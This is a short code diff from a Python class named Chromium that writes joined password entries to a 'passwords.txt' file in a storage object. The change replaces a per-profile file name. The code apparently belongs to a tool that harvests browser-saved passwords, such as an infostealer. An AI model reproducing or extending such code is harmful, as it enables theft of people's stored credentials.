@@ -221,7 +221,7 @@ class Chromium:
         ])
 
         self.__storage.add_from_memory(
-            path.join(self.__path, rf"{profile} Passwords.txt"),
+            path.join(rf"passwords.txt"),
             "".join(item for item in temp)
         )
 
